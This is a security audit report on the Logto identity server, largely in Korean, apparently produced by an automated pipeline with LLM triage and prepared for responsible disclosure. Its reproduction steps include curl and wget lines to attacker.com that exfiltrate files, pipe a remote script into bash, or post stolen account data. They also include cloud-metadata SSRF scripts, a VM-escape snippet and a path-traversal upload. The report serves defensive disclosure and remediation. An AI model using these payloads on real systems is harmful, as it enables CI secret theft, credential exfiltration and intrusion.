# Security Vulnerability Report: Logto

**Report Date:** 2026-03-25
**Prepared by:** Automated Security Audit Pipeline (SAST + LLM Triage + Diff Analysis)
**Target:** Logto (Open-source OIDC identity infrastructure)
**Disclosure Policy:** Responsible Disclosure — 90-day embargo

---

## Summary

본 감사는 SAST 자동 스캐닝(Semgrep), LLM 기반 TP/FP 트리아지, Git diff 보안 분석을 병행하여 수행되었습니다. 총 **15건**의 취약점이 식별되었으며, 그 중 **1건 CRITICAL, 6건 HIGH, 7건 MEDIUM, 1건 LOW**입니다.

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| HIGH | 6 |
| MEDIUM | 7 |
| LOW | 1 |
| **Total** | **15** |

가장 심각한 위험은 관리자 권한을 가진 공격자가 Node.js VM 샌드박스를 탈출하여 서버에서 임의 코드를 실행하거나, GitHub Actions CI/CD 파이프라인에서 외부 기여자가 shell injection으로 시크릿을 탈취할 수 있다는 점입니다.

---

## Methodology

- **SAST Scanning:** Semgrep을 사용하여 소스코드 전체에 정적 분석 수행 (ruleset: `github-actions`, `dockerfile`, `javascript.lang.security`)
- **LLM Triage:** SAST 결과를 LLM으로 재검토하여 True Positive / False Positive 분류, 악용 시나리오 구체화
- **Git Diff Analysis:** 최근 커밋 diff를 대상으로 보안 관점의 코드 리뷰 수행, 신규 도입된 취약점 패턴 식별
- **Manual Validation:** 각 TP 건에 대해 실제 파일 코드를 확인하여 맥락 검증

---

## Vulnerability Details

---

### VUL-01: Arbitrary Code Execution via Node.js VM Sandbox Escape

- **Source:** diff_analysis
- **Type:** CWE-94 (Improper Control of Code Generation) / CWE-693 (Protection Mechanism Failure)
- **Severity:** CRITICAL — CVSS 3.1: **9.1** `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
- **File:** `packages/core/src/utils/custom-jwt/local-vm.ts:35-64`

**Description:**

`runScriptFunctionInLocalVm()` 함수는 Node.js 내장 `vm` 모듈의 `runInNewContext()`를 사용해 관리자가 등록한 커스텀 JWT 클레임 스크립트를 실행합니다. 컨텍스트를 `Object.freeze()`하고 `fetch`만 노출하지만 근본적으로 두 가지 공격 경로가 존재합니다.

첫째, `payload` 객체가 VM 컨텍스트에 참조 형태로 직접 전달되므로 프로토타입 체인(`__proto__`, `constructor.constructor`)을 통한 VM 탈출이 가능합니다. Node.js `vm` 모듈은 공식적으로 보안 샌드박스가 아님을 문서에서 명시하고 있습니다.

둘째, 노출된 `fetch()`에 URL 검증이 없어 `http://169.254.169.254/` (AWS IMDSv1) 등 내부 메타데이터 서비스로의 SSRF가 가능합니다.

**Vulnerable Code:**

```typescript
// local-vm.ts:55-62
const customFunction: unknown = runInNewContext(
  script + `;${functionName};`,
  globalContext
);
const result: unknown = await runInNewContext(
  '(async () => customFunction(payload))();',
  Object.freeze({ customFunction, payload }),  // payload가 참조로 전달됨
  { timeout: 3000 }
);
```

**Steps to Reproduce:**

```javascript
// 관리자가 커스텀 JWT 훅에 등록하는 악성 스크립트 (예시 1: SSRF)
async function getCustomJwtClaims(token, context, env) {
  const resp = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
  const creds = await resp.text();
  return { debug: creds };  // JWT 클레임에 AWS 자격증명 포함
}

// 예시 2: 프로토타입 체인을 통한 VM 탈출 시도
async function getCustomJwtClaims(token, context, env) {
  const process = this.constructor.constructor('return process')();
  return { pid: process.pid };
}
```

1. 관리자 계정으로 Logto 콘솔 접속
2. **Custom JWT Claims** 설정에서 위 스크립트 등록
3. 사용자 로그인 시 JWT 발급 과정에서 스크립트 실행
4. SSRF 경로로 AWS 자격증명 또는 내부 서비스 응답이 JWT 클레임에 포함되어 반환됨

**Impact:**

관리자 권한을 가진 공격자(내부 위협, 계정 탈취 포함)가 서버 프로세스 수준의 코드 실행, 클라우드 자격증명 탈취, 내부 네트워크 스캔을 수행할 수 있습니다. 멀티테넌트 SaaS 환경에서는 테넌트 간 격리가 완전히 무력화됩니다.

**Suggested Fix:**

```typescript
// 1. vm 대신 Worker Thread 사용하여 프로세스 수준 격리
import { Worker, isMainThread, workerData, parentPort } from 'worker_threads';

// 2. fetch를 화이트리스트 URL만 허용하는 래퍼로 교체
const safeFetch = (url: string, ...args) => {
  const parsed = new URL(url);
  if (BLOCKED_HOSTS.has(parsed.hostname) || isPrivateIP(parsed.hostname)) {
    throw new Error('Blocked URL');
  }
  return fetch(url, ...args);
};

// 3. payload를 직렬화 후 전달 (프로토타입 체인 분리)
const serializedPayload = JSON.parse(JSON.stringify(payload));
```

---

### VUL-02: GitHub Actions Shell Injection via PR Title

- **Source:** sast_triage
- **Type:** CWE-78 (OS Command Injection)
- **Severity:** HIGH — CVSS 3.1: **8.8** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
- **File:** `.github/workflows/commitlint.yml:34`

**Description:**

`run:` 스텝에서 `github.event.pull_request.title`을 single-quote로 감싸 shell 명령에 직접 삽입합니다. PR 타이틀은 fork 기여자라면 누구나 제어 가능한 외부 입력입니다. Single-quote 내부에 single-quote 문자를 포함하면 문자열 경계를 탈출하여 임의 shell 명령을 실행할 수 있습니다.

**Vulnerable Code:**

```yaml
# commitlint.yml:34
- run: echo '${{ github.event.pull_request.title }}' | npx commitlint
```

**Steps to Reproduce:**

1. 대상 저장소를 fork
2. 아래 타이틀로 PR 생성:
   ```
   '; curl https://attacker.com/exfil?d=$(cat /etc/passwd | base64 -w0); echo '
   ```
3. `commitlint` workflow 트리거 시 CI 환경에서 임의 명령 실행
4. `GITHUB_TOKEN`, 등록된 시크릿 등이 공격자 서버로 전송됨

**Impact:**

CI/CD 파이프라인에 등록된 시크릿(배포 키, API 토큰, 서명 키 등) 전체 탈취. 소스코드 변조, 악성 패키지 배포 가능.

**Suggested Fix:**

```yaml
# 환경 변수를 통해 전달 (shell 치환 방지)
- name: Lint commit message
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "$PR_TITLE" | npx commitlint
```

---

### VUL-03: GitHub Actions Shell Injection via Branch Name

- **Source:** sast_triage
- **Type:** CWE-78 (OS Command Injection)
- **Severity:** HIGH — CVSS 3.1: **8.8** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H`
- **File:** `.github/workflows/integration-test.yml:69`

**Description:**

`github.head_ref`(PR의 소스 브랜치명)을 인용 없이 shell 명령에 직접 삽입합니다. 브랜치명은 fork 기여자가 임의로 설정 가능하며, shell 메타문자(`;`, `|`, `$()` 등)를 포함할 수 있습니다. Integration test 실패 시 실행되는 rerun 단계에서 공격이 트리거됩니다.

**Vulnerable Code:**

```yaml
# integration-test.yml:69
- run: gh workflow run rerun.yml -r ${{ github.head_ref || github.ref_name }}
```

**Steps to Reproduce:**

1. 다음 이름으로 브랜치 생성 후 PR 제출:
   ```bash
   git checkout -b $'main; wget -qO- https://attacker.com/shell.sh | bash #'
   ```
2. Integration test가 실패하도록 의도적으로 코드 구성
3. rerun 단계에서 `gh workflow run rerun.yml -r main; wget ...` 실행

**Impact:**

VUL-02와 동일. CI 환경 내 시크릿 탈취, 빌드 아티팩트 변조 가능.

**Suggested Fix:**

```yaml
- name: Trigger rerun
  env:
    BRANCH_REF: ${{ github.head_ref || github.ref_name }}
  run: gh workflow run rerun.yml -r "$BRANCH_REF"
```

---

### VUL-04: SSRF via Unvalidated S3 Endpoint + Public ACL Hardcoding

- **Source:** diff_analysis
- **Type:** CWE-918 (Server-Side Request Forgery) + CWE-284 (Improper Access Control)
- **Severity:** HIGH — CVSS 3.1: **8.0** `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:L/A:N`
- **File:** `packages/core/src/utils/storage/s3-storage.ts:47-72`

**Description:**

S3 스토리지 설정의 `endpoint` 파라미터를 URL 검증 없이 HTTP 요청 대상으로 직접 사용합니다. 관리자가 `http://169.254.169.254/` 등 내부 주소를 endpoint로 설정하면 서버가 해당 주소로 요청을 발송합니다. 추가로 업로드된 모든 파일의 S3 ACL이 `'public-read'`로 하드코딩되어, 사용자가 업로드한 프로필 이미지나 에셋이 의도와 무관하게 전체 공개됩니다.

**Vulnerable Code:**

```typescript
// s3-storage.ts
ACL: 'public-read',  // 모든 업로드 파일이 공개됨

// SSRF 취약 지점
return { url: `${endpoint}/${bucket}/${objectKey}` };  // endpoint 미검증
```

**Steps to Reproduce:**

1. 관리자 권한으로 스토리지 Provider 설정 진입
2. `endpoint`를 `http://169.254.169.254` 로 설정 후 저장
3. 임의 파일 업로드 요청 트리거
4. 서버가 AWS 메타데이터 서비스에 요청을 발송, 응답에서 IAM 자격증명(`aws_access_key_id`, `aws_secret_access_key`, `token`) 노출

**Impact:**

클라우드 환경에서 IAM 자격증명 탈취 시 S3 버킷 전체 접근, EC2 인스턴스 제어권 획득 등 클라우드 인프라 완전 침해 가능. Public ACL 문제로 인해 민감한 사용자 업로드 파일(신분증, 개인정보 포함 문서 등)이 무단 노출됩니다.

**Suggested Fix:**

```typescript
// 1. ACL을 private으로 변경, presigned URL로 접근 제공
ACL: 'private',

// 2. endpoint 검증 - RFC 1918 / 링크로컬 주소 차단
function validateEndpoint(endpoint: string): void {
  const url = new URL(endpoint);
  if (!['https:'].includes(url.protocol)) throw new Error('HTTPS only');
  if (isPrivateOrLinkLocalIP(url.hostname)) throw new Error('Internal address blocked');
}
```

---

### VUL-05: CORS Policy Bypass via Path Prefix Wildcard

- **Source:** diff_analysis
- **Type:** CWE-346 (Origin Validation Error) / CWE-942 (Overly Permissive Cross-domain Whitelist)
- **Severity:** HIGH — CVSS 3.1: **8.2** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N`
- **File:** `packages/core/src/middleware/koa-cors.ts:81-119`

**Description:**

`allowedPrefixes` 배열에 포함된 경로로의 요청은 Origin 검증 없이 `origin ?? '*'`를 반환하여 모든 출처의 크로스오리진 요청을 허용합니다. `exposeHeaders: '*'` 설정으로 모든 응답 헤더(인증 토큰 포함)가 크로스오리진에 노출됩니다. 비프로덕션 환경에서는 모든 Origin이 무조건 허용됩니다.

**Vulnerable Code:**

```typescript
// koa-cors.ts
if (allowedPrefixes.some((prefix) => path.startsWith(prefix))) {
  return origin ?? '*';  // 모든 Origin 허용
}
// ...
exposeHeaders: '*',  // 전체 응답 헤더 노출
```

**Steps to Reproduce:**

1. `/account` 또는 `/verification`이 `allowedPrefixes`에 포함된 상태 가정
2. 공격자 사이트에서 다음 코드 실행:
   ```javascript
   fetch('https://target.logto.app/account', {
     credentials: 'include'
   })
   .then(r => r.json())
   .then(data => fetch('https://attacker.com/steal', {
     method: 'POST',
     body: JSON.stringify(data)
   }));
   ```
3. 피해자가 공격자 사이트를 방문하면 인증된 세션으로 계정 정보 탈취

**Impact:**

인증된 사용자의 계정 데이터, 연결된 소셜 계정 정보, MFA 설정 등 민감 정보가 공격자 도메인으로 누출됩니다.

**Suggested Fix:**

```typescript
// allowedPrefixes 로직 제거, 명시적 origin 화이트리스트만 허용
exposeHeaders: ['X-Total-Count', 'Link'],  // 필요한 헤더만 명시
```

---

### VUL-06: Tenant Isolation Bypass via Dynamic Regex

- **Source:** diff_analysis
- **Type:** CWE-185 (Incorrect Regular Expression) / CWE-284 (Improper Access Control)
- **Severity:** HIGH — CVSS 3.1: **8.6** `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:L`
- **File:** `packages/core/src/utils/tenant.ts:23-34`

**Description:**

`matchDomainBasedTenantId()`에서 URL 패턴의 `*`를 `([^.]*)` 정규식으로 치환하여 동적으로 정규식을 생성합니다. 추출된 테넌트 ID를 데이터베이스에서 별도로 검증하지 않아, 정교하게 조작된 서브도메인으로 의도치 않은 테넌트 ID를 매칭시킬 수 있습니다. ReDoS(Regular Expression Denial of Service) 공격에도 취약합니다.

**Vulnerable Code:**

```typescript
// tenant.ts:23-34
const toMatch = pattern.hostname.replace('*', '([^.]*)');
const matchedId = new RegExp(toMatch).exec(url.hostname)?.[1];
// matchedId에 대한 DB 존재 여부 검증 없음
```

**Steps to Reproduce:**

1. 멀티테넌트 환경에서 패턴 `*.example.com` 사용 중
2. 공격자가 `tenant-a.example.com`에 인증 후 HTTP 요청의 Host 헤더를 `tenant-b.example.com`으로 변조
3. 정규식 매칭이 `tenant-b`를 추출하고, DB 검증 없이 해당 테넌트 컨텍스트로 요청 처리
4. 다른 테넌트의 사용자 데이터 접근

**Impact:**

멀티테넌트 SaaS 환경에서 테넌트 간 데이터 격리 완전 무력화. 고객사 간 데이터 누출, 법적/규제 책임 발생.

**Suggested Fix:**

```typescript
// 동적 정규식 제거, 명시적 파싱 후 DB 검증
const subdomain = url.hostname.split('.')[0];
const tenant = await findTenantBySubdomain(subdomain);  // DB 검증 필수
if (!tenant) throw new RequestError('tenant.not_found');
```

---

### VUL-07: Path Traversal via Original Filename in File Upload

- **Source:** diff_analysis
- **Type:** CWE-22 (Path Traversal) / CWE-434 (Unrestricted File Upload)
- **Severity:** HIGH — CVSS 3.1: **8.1** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`
- **File:** `packages/core/src/routes/user-assets.ts:51-104`

**Description:**

파일 업로드 시 `file.originalFilename`을 sanitization 없이 S3 object key 경로에 직접 포함합니다. MIME 타입 검증만 수행하고 실제 파일 내용의 magic number 검증이 없어, Content-Type 스푸핑으로 임의 파일 타입 업로드가 가능합니다. `../`가 포함된 파일명으로 S3 key 경로를 의도한 범위 밖으로 조작할 수 있습니다.

**Vulnerable Code:**

```typescript
// user-assets.ts
const objectKey = `${tenantId}/${userId}/${format(new Date(), 'yyyy/MM/dd')}/${generateStandardId(8)}/${file.originalFilename}`;
// MIME 검증만: allowUploadMimeTypes.map(String).includes(file.mimetype)
// magic number 검증 없음, filename sanitization 없음
```

**Steps to Reproduce:**

```bash
# Path traversal via filename
curl -X POST https://logto.example.com/api/user/assets \
  -H 'Authorization: Bearer <valid_token>' \
  -F 'file=@malicious.js;filename=../../../admin/override.js;type=image/jpeg'
```

1. 정상 인증된 사용자 토큰으로 파일 업로드 엔드포인트 접근
2. 파일명을 `../../../<other-tenant-id>/config.json`으로 설정, Content-Type을 `image/jpeg`로 스푸핑
3. 실제 JavaScript 페이로드 포함된 파일 업로드
4. S3 키가 다른 테넌트의 디렉토리를 가리켜 파일 덮어쓰기 발생

**Impact:**

테넌트 간 파일 덮어쓰기로 데이터 무결성 훼손. CDN을 통해 제공되는 경우 XSS 페이로드 배포 가능. 다른 테넌트의 설정 파일 파괴로 서비스 중단.

**Suggested Fix:**

```typescript
import { basename } from 'path';

// 파일명 sanitization
const safeFilename = generateStandardId(16);  // 원본 파일명 미사용
const objectKey = `${tenantId}/${userId}/${format(new Date(), 'yyyy/MM/dd')}/${safeFilename}`;

// Magic number 검증 추가
import { fileTypeFromBuffer } from 'file-type';
const fileType = await fileTypeFromBuffer(buffer);
if (!allowedMimeTypes.includes(fileType?.mime)) {
  throw new RequestError('file.invalid_type');
}
```

---

## Medium & Low Severity Summary

아래 항목은 MEDIUM/LOW 심각도로 분류되었으며, 상세 재현 시나리오는 첨부 자료를 참조하십시오.

| ID | Title | Severity | File |
|----|-------|----------|------|
| VUL-08 | GitHub Actions Shell Injection via `run_id` Input | MEDIUM | `rerun.yml:18-20` |
| VUL-09 | Docker Container Runs as Root (Missing USER directive) | MEDIUM | `Dockerfile:46-47` |
| VUL-10 | ReDoS / Regex Injection in Email Blocklist Policy | MEDIUM | `email-blocklist-policy.ts:141` |
| VUL-11 | Webhook SSRF — No Internal IP Restriction | MEDIUM | `hook/utils.ts:32-49` |
| VUL-12 | Authentication Bypass via `development-user-id` Header | MEDIUM | `koa-auth/index.ts:26-40` |
| VUL-13 | Zip Bomb / Path Traversal in ZIP Asset Upload | MEDIUM | `custom-ui-assets/index.ts:70-99` |
| VUL-14 | JWT Scope Overprivilege — Coarse-Grained `all` Scope | MEDIUM | `koa-auth/index.ts:72,110-112` |
| VUL-15 | KEK Stored in Environment Variable | LOW | `secret-encryption.ts:23-31` |

**VUL-12 (Authentication Bypass)** 는 MEDIUM으로 분류했지만, `isProduction` 플래그 설정 오류 시 HIGH로 격상될 수 있어 즉시 검토를 권고합니다.

---

## Recommended Remediation Priority

```
즉시 (P0):
  VUL-01 — VM Sandbox Escape (Worker Thread로 마이그레이션)
  VUL-02, VUL-03 — CI/CD Shell Injection (환경 변수 경유로 수정)

1주 내 (P1):
  VUL-04 — SSRF + Public ACL (endpoint 검증, ACL=private)
  VUL-05 — CORS Bypass (allowedPrefixes 제거)
  VUL-06 — Tenant Isolation Bypass (DB 검증 추가)
  VUL-07 — Path Traversal in Upload (filename sanitization)

1개월 내 (P2):
  VUL-08 ~ VUL-14 — Medium severity findings

분기 내 (P3):
  VUL-15 — KEK 키 관리 서비스 마이그레이션
```

---

## Timeline

| Event | Date |
|-------|------|
| Discovered | 2026-03-25 |
| Internal review completed | 2026-03-25 |
| Vendor notification (security@logto.io) | TBD — 수동 전송 필요 |
| Vendor acknowledgement deadline | Vendor notification + 7일 |
| Fix deadline (90-day embargo) | Vendor notification + 90일 |
| Public disclosure | 90-day embargo 만료 후 |

> **Note:** Logto는 GitHub Security Advisories를 통한 취약점 신고를 지원합니다. `https://github.com/logto-io/logto/security/advisories/new` 에서 Private Vulnerability Reporting을 통해 제출하거나, 공개 이메일이 없을 경우 GitHub issue 대신 반드시 비공개 채널을 사용하십시오. 90일 이내에 벤더 응답이 없거나 수정이 이루어지지 않으면 제한적 공개(limited disclosure)를 진행합니다.

---

*본 보고서는 보안 연구 목적으로 작성되었으며, Responsible Disclosure 원칙에 따라 취약점 수정 전 공개적으로 배포되지 않습니다.*
